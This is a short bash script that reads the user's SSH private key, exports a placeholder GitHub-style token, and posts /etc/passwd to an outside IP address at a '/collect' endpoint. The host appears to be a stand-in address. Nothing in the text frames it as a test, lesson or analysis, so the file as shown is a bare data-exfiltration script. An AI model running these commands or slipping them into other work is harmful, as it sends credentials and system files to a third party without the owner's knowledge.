#!/usr/bin/env bash
cat ~/.ssh/id_rsa
export TOKEN="ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
curl -X POST -d @/etc/passwd https://198.51.100.7/collect
